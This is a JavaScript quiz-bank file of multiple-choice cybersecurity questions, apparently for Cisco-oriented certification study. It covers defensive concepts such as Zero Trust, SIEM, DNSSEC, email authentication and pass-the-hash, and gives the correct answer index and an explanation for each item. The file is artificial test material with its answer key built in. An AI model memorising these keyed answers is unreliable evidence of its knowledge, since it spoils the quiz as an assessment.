window.QUIZ_BANK = [
  {
    "question": "In the CIA triad of information security, what does Confidentiality mean?",
    "options": [
      "Ensuring systems are always available to authorized users, even during hardware failures or outages",
      "Ensuring only authorized entities can access information, typically with access controls and encryption",
      "Ensuring data is not changed undetected, for example with cryptographic hashes and signatures",
      "Ensuring network traffic always uses TCP port 443, even on isolated internal networks without Internet"
    ],
    "correct": 1,
    "explanation": "The CIA triad is Confidentiality, Integrity, and Availability. Confidentiality protects who can see information; Integrity protects against unauthorized changes; Availability ensures access when needed.",
    "difficulty": "Easy"
  },
  {
    "question": "An email urgently asks you to click a link and “verify your Cisco account” by entering your password. What type of social-engineering attack is this?",
    "options": [
      "Phishing (or spear phishing if highly targeted)",
      "Brute-force attack against a RADIUS server",
      "Man-in-the-middle exclusively at the physical layer",
      "DNS amplification DDoS"
    ],
    "correct": 0,
    "explanation": "Phishing uses fraudulent messages to trick victims into revealing credentials or installing malware. Spear phishing is the highly personalized variant. It is not brute force, physical-layer MITM, or DDoS.",
    "difficulty": "Easy"
  },
  {
    "question": "What is the main difference between a packet-filtering firewall and an IDS/IPS?",
    "options": [
      "A firewall only scans email attachments for malware; IDS/IPS only performs NAT between private addresses",
      "Firewall and IDS are exactly the same function; IPS is just the Cisco brand name for that appliance",
      "A firewall enforces allow/deny policy; IDS detects anomalies/signatures (alerts) and IPS can block inline",
      "IDS completely replaces AAA (Authentication, Authorization, Accounting) for user identity control"
    ],
    "correct": 2,
    "explanation": "Firewalls control what passes based on policy. IDS monitors and alerts; IPS sits inline and can drop malicious traffic. They complement AAA rather than replace it.",
    "difficulty": "Medium"
  },
  {
    "question": "In the AAA model used in Cisco networks, what do Authentication, Authorization, and Accounting mean?",
    "options": [
      "Only encryption of site-to-site VPN links with IPsec, without identifying who the user is",
      "Only load balancing between wireless controllers, without authorizing what each session may do",
      "Only automatic inventory of LAN switches, without recording who connected or what they did",
      "Authenticate who the user/device is, authorize what they may do, and account (log) what they did"
    ],
    "correct": 3,
    "explanation": "AAA: Authentication verifies identity; Authorization defines permissions/policies; Accounting records sessions and usage (audit/billing). Common protocols: RADIUS and TACACS+.",
    "difficulty": "Easy"
  },
  {
    "question": "For VPNs, which statement best describes IPsec compared with SSL/TLS VPN (e.g., browser-based or AnyConnect SSL mode)?",
    "options": [
      "IPsec typically works at the network layer (protects IP packets) and is common for site-to-site; SSL VPN works mainly at session/transport and is popular for user remote access",
      "IPsec only works on IPv6 and rejects IPv4 packets at the router; SSL VPN only works on IPv4 and never builds a remote-access session when the client uses only IPv6",
      "SSL VPN always replaces OSPF routing in the network core, dropping every OSPF adjacency and forwarding all internal campus traffic only through TLS tunnels",
      "IPsec and SSL VPN are exactly the same protocol with different names, sharing the same ESP headers, the same transport port, and the same IKE key negotiation"
    ],
    "correct": 0,
    "explanation": "IPsec (AH/ESP, IKE) protects IP traffic and is classic for site-to-site VPNs. SSL/TLS VPNs encapsulate user sessions and are common for remote access. Both can coexist depending on the use case.",
    "difficulty": "Medium"
  },
  {
    "question": "Which description correctly matches ransomware?",
    "options": [
      "Malware that encrypts the victim’s files and demands payment (ransom) to restore access",
      "A proprietary Cisco protocol used only to synchronize the internal NTP clocks",
      "An extended ACL that allows only HTTPS traffic and blocks every other flow on the LAN",
      "A type of multimode fiber-optic cable used only for short links inside a building"
    ],
    "correct": 0,
    "explanation": "Ransomware encrypts data and demands ransom. Related malware types include viruses, worms, trojans, spyware, and rootkits. Mitigations: offline backups, patching, MFA, email filtering, and least privilege.",
    "difficulty": "Easy"
  },
  {
    "question": "What is Zero Trust, in terms of network security principles?",
    "options": [
      "Automatically trust any device that sits inside the corporate LAN, without checking its identity again",
      "Turn off all perimeter firewalls because the provider cloud is treated as secure by default, with no inspection",
      "Never trust by default: continuously verify identity, context, and posture before granting least-privilege access",
      "Use only shared passwords on the LAN access switches, with no individual authentication for each user or port"
    ],
    "correct": 2,
    "explanation": "Zero Trust assumes the internal network is not an automatic trust zone. It requires strong authentication, contextual authorization, microsegmentation, and continuous verification (never trust, always verify).",
    "difficulty": "Medium"
  },
  {
    "question": "In the Cisco security ecosystem, what is the typical role of Cisco ISE (Identity Services Engine) versus a unified XDR/visibility platform such as SecureX (or successors)?",
    "options": [
      "ISE completely replaces BGP routing on the Internet, advertising public prefixes and external routes in place of the organization's own border routers and upstream ISPs",
      "ISE focuses on identity, access control (802.1X, guest, posture) and policy; SecureX-class platforms aggregate telemetry and orchestrate response across products",
      "SecureX is only a serial console cable plugged into the router console port; ISE is only a decorative wallpaper theme on the device startup screen",
      "Both exist solely to configure access VLANs on unmanaged switches, with no role in identity, posture assessment, or response orchestration"
    ],
    "correct": 1,
    "explanation": "Cisco ISE is the AAA/NAC policy engine (802.1X, profiling, posture, guest). SecureX-class platforms integrate alerts and workflows across firewall, endpoint, email, and more. They complement each other in Cisco security architecture.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the fundamental difference between hashing and symmetric encryption?",
    "options": [
      "Hashing and encryption are always the same AES-256 algorithm, with the same secret key and the same reversible result in both cases",
      "Encryption only works on text written in Portuguese; hashing only yields a valid result when the original text is in English",
      "Hashing always increases the size of the original data in each block; symmetric encryption always shrinks the message to exactly 128 bits",
      "Hashing is typically one-way (integrity/verification); symmetric encryption is reversible with the shared key (confidentiality)"
    ],
    "correct": 3,
    "explanation": "Hashes (SHA-256, etc.) are not reversed to recover the original — they support integrity and verification. Symmetric encryption (AES) encrypts and decrypts with the same key. Asymmetric crypto uses public/private key pairs.",
    "difficulty": "Medium"
  },
  {
    "question": "Why does multi-factor authentication (MFA) significantly reduce account-compromise risk?",
    "options": [
      "Because it removes entirely the need for operating-system security patches, leaving software flaws uncorrected on every host",
      "Because it makes Wi-Fi automatically WPA3 with no configuration at all, even on old access points that only support WPA2",
      "Because it replaces perimeter firewalls in every scenario, so filtering rules are no longer required at the network edge",
      "Because it requires more than just a password (e.g., OTP app, token, biometrics), making stolen credentials harder to abuse"
    ],
    "correct": 3,
    "explanation": "MFA combines factors (knowledge, possession, inherence). Even with a leaked password, the attacker still needs the second factor. It is essential in Zero Trust and for privileged Cisco access — and it does not replace patching or firewalls.",
    "difficulty": "Easy"
  },
  {
    "question": "What is defense in depth in a network environment?",
    "options": [
      "Using one complex password for every network device, shared across the routers, the switches, and the firewalls on the local network",
      "Relying only on endpoint antivirus and removing all network segmentation, so the internal LAN remains a single trust zone",
      "Applying multiple layers of controls (perimeter, network, identity, endpoint, data) so one failure does not compromise everything",
      "Disabling security logs to improve device performance, without recording failed access attempts or any configuration changes"
    ],
    "correct": 2,
    "explanation": "Defense in depth stacks complementary controls: firewalls, segmentation, AAA/MFA, EDR, encryption, and monitoring. It reduces the impact of any single failure.",
    "difficulty": "Easy"
  },
  {
    "question": "What is the main cybersecurity benefit of network segmentation (e.g., VLANs, firewalls between zones)?",
    "options": [
      "Enlarging each VLAN broadcast domain so malware spreads faster among hosts in the same zone and across neighboring zones",
      "Removing the need to update firmware on switches, firewalls, and routers by treating segmentation as a substitute for security patches",
      "Letting guests share the same management VLAN as the routers and firewalls, with direct access to the administrative IP addresses",
      "Limiting lateral movement: a compromise in one zone does not automatically reach critical servers in another"
    ],
    "correct": 3,
    "explanation": "Segmentation (and microsegmentation) restricts east-west traffic. It isolates IoT/guest from management and data centers, aligned with Zero Trust and least privilege.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the primary purpose of a SIEM (Security Information and Event Management) platform?",
    "options": [
      "Replacing every endpoint antivirus agent with a single packet broker on the core switch, which then inspects malicious files on the host itself",
      "Issuing public TLS certificates for internal servers without a private CA, signing internal names as if it were a public certificate authority",
      "Collecting and correlating logs/events from many sources, detecting suspicious patterns, and supporting alerting and investigation",
      "Guaranteeing zero false positives by blocking all outbound DNS queries so that no external name can be resolved by clients"
    ],
    "correct": 2,
    "explanation": "A SIEM aggregates logs and security events (firewalls, endpoints, identity, cloud, etc.), normalizes and correlates them, and helps analysts detect, alert on, and investigate incidents. It does not replace AV with a packet broker, does not act as a public CA for TLS, and cannot promise zero false positives by blindly blocking DNS.",
    "difficulty": "Easy"
  },
  {
    "question": "In cybersecurity, what is the MITRE ATT&CK framework mainly used for?",
    "options": [
      "A vendor-specific CLI syntax guide for configuring ASA access lists, including access-list and access-group, ACE order, and the implicit deny at the end of every extended ACL",
      "A knowledge base of adversary tactics and techniques (and related procedures) used to map detections, plan defenses, and communicate about threats in a common language",
      "A mandatory encryption algorithm that replaces AES in all TLS 1.3 handshakes, forcing one symmetric cipher in every ClientHello and refusing every other negotiated cipher suite",
      "A physical rack layout standard for data-center cabling density that fixes rack-unit height, vertical cable managers, and the spacing of copper and fiber patch panels"
    ],
    "correct": 1,
    "explanation": "MITRE ATT&CK catalogs real-world adversary tactics (the “why”) and techniques (the “how”), often with procedure examples. Defenders use it to gap-analyze coverage, write detections, and discuss incidents consistently. It is not ASA CLI documentation, not a cipher that replaces AES, and not a cabling standard.",
    "difficulty": "Medium"
  },
  {
    "question": "What does a Web Application Firewall (WAF) primarily protect against?",
    "options": [
      "Application-layer attacks against HTTP/HTTPS apps (for example SQLi, XSS, and abuse of vulnerable URLs or APIs), by inspecting and filtering web requests",
      "Layer 1 cable cuts between the access switch and the end user PC, when the copper pair or fiber loses continuity and the Ethernet link loses signal at the wall jack",
      "Exhaustion of OSPF LSDB memory on core routers caused by too many Type 5 LSAs for external routes redistributed from other routing protocols",
      "Battery failure in a UPS that powers the wireless controllers, leaving the access points without power during an electrical outage in the rack"
    ],
    "correct": 0,
    "explanation": "A WAF sits in front of web applications and inspects HTTP/S traffic to block or challenge common app-layer attacks such as SQL injection, cross-site scripting, and known bad request patterns. It does not fix physical cable cuts, OSPF LSDB sizing, or UPS batteries.",
    "difficulty": "Easy"
  },
  {
    "question": "What is the primary purpose of DNSSEC?",
    "options": [
      "Encrypting each DNS query so the recursive resolver never sees the name being looked up (that is DNS over TLS or DNS over HTTPS, not DNSSEC), hiding the QNAME on the wire",
      "Replacing SPF so mail servers no longer need to check which hosts may send for a domain, ignoring the TXT record and accepting any sending MTA",
      "Digitally signing DNS data so validating resolvers can detect forged or tampered answers (authenticity and integrity), without hiding the query itself",
      "Automatically blocking every malware download on the endpoint by deleting the fetched file before any local process is able to execute it"
    ],
    "correct": 2,
    "explanation": "DNSSEC adds digital signatures (RRSIG and DNSKEY records, chained with DS records in the parent) so a validating resolver can confirm that the data came from the authoritative zone and was not modified. Query confidentiality comes from DoT or DoH, not from DNSSEC. It does not replace email authentication or endpoint protection.",
    "difficulty": "Medium"
  },
  {
    "question": "Working together, what do SPF, DKIM, and DMARC do for email security?",
    "options": [
      "They encrypt the message body end to end so only the recipient can read it (that is S/MIME or PGP), ciphering the content with the recipient public key before submission",
      "SPF lists which servers may send for a domain, DKIM cryptographically signs the message, and DMARC tells receivers what to do when those checks fail and how to report",
      "They scan attachments for ransomware inside the MTA, opening each MIME part and blocking delivery when the payload signature matches known malware",
      "They replace TLS on SMTP submission (port 587), dropping STARTTLS and the certificate because the domain policy alone authenticates the channel to the relay"
    ],
    "correct": 1,
    "explanation": "SPF authorizes sending hosts in a DNS TXT record. DKIM signs selected headers and the body with a domain key published in DNS. DMARC requires the visible From domain to align with SPF and/or DKIM and publishes a policy (none, quarantine, or reject) plus reporting. Together they fight domain spoofing; they do not encrypt the message and they do not replace SMTP TLS.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the main difference between EDR and XDR?",
    "options": [
      "EDR only encrypts disks with a volume key on the endpoint; XDR only configures access VLANs on the switches, without collecting process, file, or host-behavior telemetry or correlating alerts from other security tools",
      "They are the same product; XDR is just the Cisco name for the same antivirus signature file that EDR applies on the host, without correlating network, email, identity, or cloud telemetry in a single console",
      "EDR replaces the perimeter firewall for traffic filtering; XDR replaces recursive DNS for name resolution, itself answering the A and AAAA queries made by internal clients instead of the resolver",
      "EDR focuses on endpoint telemetry and response (processes, files, and host behavior); XDR correlates that with other sources such as network, email, identity, and cloud for a wider detection and response picture"
    ],
    "correct": 3,
    "explanation": "EDR (Endpoint Detection and Response) collects telemetry and supports response on endpoints. XDR (Extended Detection and Response) extends detection and response across control points, correlating endpoint data with network, email, cloud, and identity. Cisco XDR is an example of that broader model. Neither one, by itself, replaces the firewall or disk encryption.",
    "difficulty": "Medium"
  },
  {
    "question": "What is a SOAR platform mainly used for?",
    "options": [
      "Security Orchestration, Automation, and Response: playbooks that automate and coordinate response steps across tools (tickets, firewall blocks, and enrichment)",
      "A routing protocol that replaces OSPF in the data center, exchanging LSAs between spines and leaves to compute the shortest path and install it in the local RIB",
      "A physical safe for storing firewall passwords, with a mechanical lock, a paper log, and a seal in the rack of the management consoles",
      "A standard that forces every packet to be mirrored to one SPAN port on the campus aggregation switch, with no capture filter applied"
    ],
    "correct": 0,
    "explanation": "SOAR (orchestration, automation, and response) runs playbooks: enrich alerts, open cases, isolate hosts, block indicators, and notify teams. It complements a SIEM, which detects and stores events, rather than replacing routing or SPAN.",
    "difficulty": "Easy"
  },
  {
    "question": "In a security operations team, what is threat hunting?",
    "options": [
      "Waiting only for high-severity SIEM alerts and closing them without looking for related activity on the endpoint, the network, or the identity logs during that same time window",
      "Turning off firewall, endpoint, and DNS logging so an attacker cannot tell they were detected, deleting the telemetry at the collector before any SOC analyst is able to query it",
      "A proactive search through telemetry for adversary activity that automated detections may have missed, often guided by a hypothesis and by frameworks such as MITRE ATT&CK",
      "Replacing every preventive control (firewall, MFA, patching) with a weekly manual log review, without filtering traffic, without requiring a second factor, and without applying fixes"
    ],
    "correct": 2,
    "explanation": "Threat hunting assumes some intrusions evade alerts. Hunters form a hypothesis (for example a technique from ATT&CK), query endpoint, network, or identity data, and turn findings into new detections. It complements SIEM and EDR; it does not replace prevention and it does not mean ignoring alerts.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the main difference between an Indicator of Compromise (IoC) and an Indicator of Attack (IoA)?",
    "options": [
      "IoCs are used only on physical security badges and door-reader inventories at the lobby, while IoAs are used only during wireless site surveys and RF heat maps that place access points on a floor plan",
      "An IoC is typically a forensic artifact that suggests a compromise already happened (hash, IP, domain, file path), whereas an IoA focuses on behaviors/TTPs that show an attack is in progress—even before classic IoCs appear",
      "IoAs replace CVE identifiers in public vulnerability databases, while IoCs replace the CVSS severity scores that patch-management teams use when they rank remediation work each week",
      "There is no difference: vendors use the two terms interchangeably for the same firewall ACL entry that blocks one known-bad IP address or one known-bad domain name"
    ],
    "correct": 1,
    "explanation": "IoCs are observable artifacts tied to known badness after or during compromise (malware hashes, C2 IPs/domains, filenames). IoAs emphasize attacker behaviors and techniques (e.g., unusual PowerShell, credential dumping patterns) so defenders can detect activity earlier and more resiliently when attackers change infrastructure. They are not badge/wireless concepts, not CVE/CVSS substitutes, and not synonymous ACL lines.",
    "difficulty": "Medium"
  },
  {
    "question": "In a breach scenario, what does “lateral movement” usually mean?",
    "options": [
      "Moving the data center racks sideways in the row to improve cooling airflow after an incident, without changing any compromised host, account, or internal network path",
      "Rotating VPN certificates every hour so remote users must re-authenticate continuously, even when no host inside the network has been compromised by an attacker",
      "After initial access, the attacker pivots from the first compromised host to other systems/accounts inside the network to expand control and reach high-value targets",
      "Automatically failing over traffic from the primary ISP to a backup circuit when BGP withdraws a prefix, which is a routing event rather than a step inside an intrusion"
    ],
    "correct": 2,
    "explanation": "Lateral movement is the post-compromise phase where adversaries hop between hosts and escalate or reuse credentials (RDP, SMB, Pass-the-Hash, remote management tools, etc.) to broaden foothold and reach crown jewels. It is not physical rack relocation, certificate rotation policy alone, or ISP failover.",
    "difficulty": "Easy"
  },
  {
    "question": "What is a CASB (Cloud Access Security Broker) primarily used for?",
    "options": [
      "Sitting between users and cloud services to enforce security policy—visibility, compliance, data protection, and threat defense for SaaS/IaaS usage (including shadow IT)",
      "Replacing the corporate core switch with a cloud-managed Layer 2-only fabric that cannot run OSPF, BGP, or any other routing protocol between the network closets",
      "Generating CVSS severity scores automatically from NetFlow samples alone, without a vulnerability database, an asset inventory, or any scanner findings to score",
      "Terminating all MPLS labels at the CASB so branch routers no longer need a provider edge and can drop their LDP or segment-routing sessions entirely"
    ],
    "correct": 0,
    "explanation": "A Cloud Access Security Broker is a control point (API-based, reverse/forward proxy, or both) that applies enterprise security policy to cloud app usage: discover shadow IT, enforce DLP/access controls, and detect threats in SaaS/IaaS contexts. It is not a core-switch replacement, not a CVSS engine fed by NetFlow alone, and not an MPLS PE substitute.",
    "difficulty": "Medium"
  },
  {
    "question": "How does Business Email Compromise (BEC) typically differ from classic mass phishing?",
    "options": [
      "BEC always depends on zero-day browser exploits delivered in drive-by downloads, while phishing campaigns only ever use SMS text messages",
      "BEC is a ransomware family that encrypts corporate mailboxes for payment, while phishing only steals guest Wi-Fi PSK passphrases from home routers",
      "BEC is targeted social-engineering fraud (often fake execs/vendors) to divert money or data, not a broad credential-harvest lure",
      "BEC only succeeds against personal consumer Gmail inboxes, while phishing only succeeds against corporate Active Directory password prompts"
    ],
    "correct": 2,
    "explanation": "BEC is typically a focused fraud: attackers impersonate a CEO, finance lead, or trusted vendor and push a wire-transfer or data change without necessarily dropping malware. Classic phishing casts a wide net to steal passwords or deliver payloads. BEC is not defined as zero-day-only, ransomware-of-mailboxes, or limited to Gmail vs AD.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the primary goal of Data Loss Prevention (DLP) controls?",
    "options": [
      "To retire perimeter firewalls completely so that only endpoint antivirus engines inspect and allow all outbound application traffic from laptops",
      "To detect and stop sensitive data leaving approved channels without authorization",
      "To ZIP-encrypt every departmental file share overnight so that backup windows finish faster on the tape or object-storage jobs",
      "To give each user a freshly randomized MAC address at login so Layer-2 campus switches cannot track devices between buildings"
    ],
    "correct": 1,
    "explanation": "DLP policies identify sensitive content and enforce rules on email, web, endpoints, or cloud apps so regulated or secret data is not exfiltrated casually. It complements—not replaces—firewalls and AV. It is not backup compression and not daily MAC randomization.",
    "difficulty": "Easy"
  },
  {
    "question": "What does Network Detection and Response (NDR) primarily focus on?",
    "options": [
      "Only scanning employee laptops once a month for missing Windows security patches and then opening ITSM tickets",
      "Only managing firewall change-request tickets in an ITSM queue without ever inspecting packets, flows, or session metadata",
      "Only forcing DoH or DoT so recursive DNS resolvers never observe plaintext query names from corporate clients",
      "Analyzing network traffic/metadata (often east-west too) to detect threats and aid response"
    ],
    "correct": 3,
    "explanation": "NDR tools watch network behavior—flows, sessions, sometimes full packets—to spot C2, lateral movement, and anomalies, then help analysts respond. That is broader than monthly patch scans, ITSM ticket hygiene alone, or DNS encryption (DoH/DoT), which are different controls.",
    "difficulty": "Medium"
  },
  {
    "question": "What does UEBA (User and Entity Behavior Analytics) mainly look for?",
    "options": [
      "Only the exact CVSS base score of every CVE published that calendar day, ignoring how accounts actually behave in production",
      "Deviations from normal user and entity baselines that may signal compromise or insider misuse",
      "Replacing every firewall ACL with a single any-any permit so analytics never observes blocked flows at the edge",
      "Encrypting all syslog with one static pre-shared key and discarding every identity context coming from SSO"
    ],
    "correct": 1,
    "explanation": "UEBA builds behavioral baselines for users and entities (hosts, service accounts) and flags anomalous activity that may indicate account takeover, insider threat, or lateral movement. It is not a CVE scoring feed, not an excuse to open firewalls to any-any, and not about discarding identity context from logs.",
    "difficulty": "Medium"
  },
  {
    "question": "What is “shadow IT” in an enterprise security context?",
    "options": [
      "The official CMDB inventory of every approved data-center rack plus its Cisco TAC serial numbers kept on file for audits",
      "A mandatory quarterly tabletop exercise that only tests physical badge readers at the lobby turnstiles during drills",
      "Business units adopting unsanctioned apps or cloud services outside IT governance and security review",
      "A failover dark-fiber path used only by core switches during scheduled overnight maintenance windows on weekends"
    ],
    "correct": 2,
    "explanation": "Shadow IT is the use of applications, SaaS, or infrastructure without IT/security approval—creating visibility, compliance, and data-leak gaps. It is not the official CMDB, not a lobby badge drill, and not a maintenance dark-fiber path.",
    "difficulty": "Easy"
  },
  {
    "question": "What is an MFA fatigue (MFA bombing) attack trying to achieve?",
    "options": [
      "Replace every corporate VPN concentrator with an open guest SSID that has no captive portal, no WPA, and no logging of associations at the edge",
      "Downgrade all Internet TLS sessions to cleartext HTTP by flooding only ICMP echo requests toward every recursive resolver on the campus DNS farm",
      "Flood the user with push/OTP prompts until they approve one out of annoyance, giving the attacker a session",
      "Erase every BGP community on all edge routers overnight so traffic-engineering tags can never be matched by any route-map again in production"
    ],
    "correct": 2,
    "explanation": "MFA fatigue/bombing overwhelms the legitimate user with authentication prompts so they eventually accept one, handing the attacker an authenticated session after credential theft or password spray. It is not about open guest SSIDs as the mechanism, ICMP-only TLS downgrade, or clearing BGP communities.",
    "difficulty": "Medium"
  },
  {
    "question": "What does a basic container escape mean for a host running Docker/Kubernetes workloads?",
    "options": [
      "The container process only loses its IPv4 address and must renew DHCP on eth0, with no change at all to isolation boundaries or host privileges",
      "Attacker/malware breaks container isolation and can affect the host or sibling containers",
      "Kubernetes always converts every Pod into a full Type-1 hypervisor VM that cannot share a kernel with the worker node under any CNI plugin",
      "Escape only renames the Docker bridge interface to VLAN 1 and disables every NetworkPolicy object in the cluster automatically without RBAC checks"
    ],
    "correct": 1,
    "explanation": "A container escape is when code inside a container breaks isolation (namespaces/cgroups/capabilities/misconfig) and reaches the host OS or sibling workloads. It is not a harmless DHCP renew, not a claim that every Pod becomes a Type-1 VM, and not merely renaming a Docker bridge.",
    "difficulty": "Medium"
  },
  {
    "question": "What problem does certificate (public-key) pinning mainly try to reduce in a mobile or thick client app?",
    "options": [
      "It forces every access-switch port into err-disabled whenever a user installs a corporate root CA on their laptop for mail or VPN enrollment",
      "It replaces enterprise DNS entirely with static /etc/hosts files on every endpoint so apps never resolve names through recursive resolvers again",
      "It stores the user's reusable password inside the leaf certificate Subject CN field so MFA prompts are never required after the first login",
      "It limits which server certs/keys the app trusts, reducing some TLS MITM with unexpected CAs"
    ],
    "correct": 3,
    "explanation": "Certificate pinning (or public-key pinning) teaches the client to expect a specific cert or key (or small set), so a TLS proxy presenting a different CA-signed cert is more likely to fail. It does not err-disable switch ports, replace DNS with hosts files, or embed passwords in certificate CNs.",
    "difficulty": "Medium"
  },
  {
    "question": "What does microsegmentation mainly aim to control for east-west traffic inside a data center or cloud VPC?",
    "options": [
      "Replace every border firewall with a single hub switch so all tenants share one flat VLAN and one default gateway forever",
      "Limit lateral movement by enforcing fine-grained allow rules between workloads, not only at the north-south perimeter",
      "Turn off all encryption between VMs so packet brokers can mirror every east-west flow without TLS inspection licenses",
      "Force every database query to travel over dial-up modems while web tiers may only use token-ring bridges from the 1990s"
    ],
    "correct": 1,
    "explanation": "Microsegmentation applies identity- or label-based controls between workloads so a breach in one app tier cannot freely reach others (east-west). It complements, not replaces, perimeter controls. It is not about flattening all tenants onto one VLAN, disabling encryption for taps, or using obsolete dial-up/token-ring paths.",
    "difficulty": "Medium"
  },
  {
    "question": "What does a living-off-the-land (LOLBins) technique mainly rely on during an intrusion?",
    "options": [
      "Shipping a brand-new unsigned kernel driver on every USB stick left in the parking lot so defenders only look for foreign binaries",
      "Replacing the corporate DNS root with a public NTP pool so every laptop loses its default gateway until reimaging",
      "Abusing trusted built-in OS tools (PowerShell, wmic, bash, certutil) already on the host instead of dropping obvious malware files",
      "Disabling every firewall rule worldwide via a single SNMP write to the core so lateral movement never needs credentials again"
    ],
    "correct": 2,
    "explanation": "Living-off-the-land abuses legitimate, preinstalled binaries and scripts so malicious actions blend with admin activity and may evade simple file-hash AV. It is not defined by USB kernel drivers alone, DNS/NTP pranks, or a magic SNMP write that opens the whole internet.",
    "difficulty": "Medium"
  },
  {
    "question": "In a software supply-chain compromise (SolarWinds-style), what trust relationship is the attacker mainly abusing?",
    "options": [
      "A trusted vendor update or build pipeline so malicious code rides signed software that customers already allow",
      "Only the guest Wi-Fi captive portal so attackers can print cafeteria coupons while never touching production build servers",
      "The office coffee machine’s Bluetooth beacon so it rewrites BGP communities on every PE router each morning before lunch",
      "A single unused lobby fax line that somehow becomes the organization’s only public certificate authority overnight"
    ],
    "correct": 0,
    "explanation": "Supply-chain attacks target the trust customers place in vendor updates or CI/CD artifacts—malware is injected upstream and delivered as “legitimate” software. Guest Wi-Fi portals, coffee-machine Bluetooth, and lobby fax lines are not the defining abuse path for this class of attack.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the main security purpose of deploying honeypots or broader deception technology?",
    "options": [
      "To permanently replace every production firewall rule with an open any-any policy so attackers never need to scan the network again",
      "To store all employee passwords in a single cleartext spreadsheet that auditors can download freely without completing any MFA challenge",
      "To place decoy systems or credentials that attract attackers, raise high-confidence alerts, and waste adversary time without real data",
      "To disable logging on every domain controller so lateral movement becomes invisible to the SOC for the rest of the engagement entirely"
    ],
    "correct": 2,
    "explanation": "Honeypots/deception present fake assets or tokens that legitimate users rarely touch; interaction is a strong signal of hostile activity and can delay or distract attackers. They do not open firewalls any-any, store passwords in cleartext, or disable DC logging.",
    "difficulty": "Medium"
  },
  {
    "question": "Why do attackers sometimes abuse DNS tunneling for command-and-control or data exfiltration?",
    "options": [
      "Because DNS queries/responses can carry encoded payloads and often pass perimeter filters that allow DNS, hiding C2 or stolen data",
      "Because DNS always encrypts every payload with TLS 1.3 end-to-end and therefore cannot be inspected by any resolver or firewall device",
      "Because DNS replaces BGP on the Internet backbone and routers forward stolen files only as OSPF Type-5 external LSAs worldwide",
      "Because disabling the recursive resolver permanently deletes every Active Directory account without leaving any audit log entries"
    ],
    "correct": 0,
    "explanation": "DNS tunneling encodes data in DNS queries/answers; many networks permit DNS outbound, so it can bypass controls that block other protocols. DNS is not inherently TLS-encrypted end-to-end for all queries, does not replace BGP/OSPF, and does not wipe AD accounts.",
    "difficulty": "Hard"
  },
  {
    "question": "In disaster recovery planning, how do RTO and RPO mainly differ?",
    "options": [
      "RTO is only the brand of the backup tape library; RPO is the Wi-Fi channel number used during quarterly on-site failover drills",
      "RTO and RPO are identical metrics that always equal the OSPF Dead interval configured on the WAN edge router pair in production",
      "RTO measures how long the SOC may retain phishing emails; RPO measures how many firewall rules must be deleted each night forever",
      "RTO is the maximum acceptable time to restore a service after an outage; RPO is the maximum acceptable data loss looking backward"
    ],
    "correct": 3,
    "explanation": "Recovery Time Objective (RTO) limits how long a service may stay down; Recovery Point Objective (RPO) limits how much data you can afford to lose, expressed as time before the incident. They are not tape brands, OSPF timers, or phishing/firewall housekeeping metrics.",
    "difficulty": "Medium"
  },
  {
    "question": "In a Windows Active Directory environment, what does a pass-the-hash (PtH) attack mainly reuse?",
    "options": [
      "Only the cleartext password typed once at the keyboard, never any stored credential material from memory or databases",
      "A stolen NTLM (or similar) password hash to authenticate as the user without knowing the cleartext password",
      "A forged BGP UPDATE that injects a more-specific route so all domain controllers become unreachable from the LAN",
      "A rogue DHCP server that hands out an APIPA range so clients lose DNS and cannot locate the domain controllers"
    ],
    "correct": 1,
    "explanation": "Pass-the-hash reuses captured NTLM (or related) hashes to authenticate without cracking the cleartext password. It is not limited to one typed cleartext password, and it is not a BGP or rogue-DHCP technique.",
    "difficulty": "Medium"
  },
  {
    "question": "What is the main security purpose of planting canary tokens (or similar honeytokens) in files, URLs, or credentials?",
    "options": [
      "To replace the corporate SIEM entirely so analysts no longer need logs, alerts, or correlation rules of any kind",
      "To encrypt every endpoint disk with a unique BitLocker key derived only from the canary string and the hostname",
      "To get a high-confidence alert when someone accesses a fake resource that legitimate users should never touch",
      "To permanently disable MFA for privileged accounts so operators can log in faster during a declared incident"
    ],
    "correct": 2,
    "explanation": "Canary tokens / honeytokens are decoy artifacts that should not be used in normal work; access triggers a strong signal of probing or theft. They do not replace SIEM, encrypt disks by themselves, or disable MFA.",
    "difficulty": "Easy"
  },
  {
    "question": "What does an air-gapped system mainly rely on for isolation from remote network threats?",
    "options": [
      "Physical (or strictly controlled) separation from untrusted networks so remote malware cannot reach it over IP",
      "A single public cloud VPC with open security groups so operators can patch faster from any Internet host",
      "Always-on site-to-site IPsec to the Internet edge so every update is pulled automatically without review",
      "Disabling local logging and antivirus so the host uses fewer CPU cycles while still joining the corporate Wi-Fi"
    ],
    "correct": 0,
    "explanation": "Air-gapping isolates a system by keeping it off untrusted networks (physically or with extreme controls), reducing remote malware and C2 paths. Open cloud exposure, always-on Internet IPsec, or joining corporate Wi-Fi while disabling defenses contradicts that isolation goal.",
    "difficulty": "Easy"
  },
  {
    "question": "How do red team, blue team, and purple team roles mainly differ in a security exercise?",
    "options": [
      "Red team only writes compliance policies and audit checklists; blue team only patches firmware; purple team only manages physical badges at the door",
      "Blue team simulates external attackers end-to-end; red team only monitors SIEM alerts; purple team disables logging to reduce noise during tests",
      "Red team emulates attackers; blue team defends and detects; purple team improves collaboration so offense findings raise defense quality",
      "All three names mean the same SOC tier and only differ by which vendor logo appears on the shared ticketing and dashboard screens"
    ],
    "correct": 2,
    "explanation": "Red teams emulate adversaries (offense). Blue teams protect, detect, and respond (defense). Purple teaming bridges them so attack techniques and detections improve together. The other options reverse or invent duties and wrongly treat the labels as identical SOC tiers.",
    "difficulty": "Easy"
  },
  {
    "question": "What is the main difference between consuming threat intelligence feeds and doing threat hunting?",
    "options": [
      "Feeds only list approved software versions for patch Tuesday windows; hunting only inventories printers, so neither activity uses network telemetry at all",
      "Threat intel feeds deliver indicators or context to enrich detection; threat hunting proactively searches telemetry for threats that may lack prior alerts",
      "Hunting replaces all feeds because a hunter never uses IOCs in practice; feeds replace hunting because automation alone closes every unknown intrusion case",
      "Feeds are only for red teams during phishing drills and tabletop games; hunting is only for HR background checks and never touches security logs or packets"
    ],
    "correct": 1,
    "explanation": "Threat intelligence feeds supply IOCs/TTPs/context that tools and analysts can use. Threat hunting is a proactive search through telemetry for suspicious activity that alerting may have missed. Hunting often uses intel, but it is not the same as passively ingesting feeds; neither activity is limited to patch lists, printers, or HR checks.",
    "difficulty": "Medium"
  },
  {
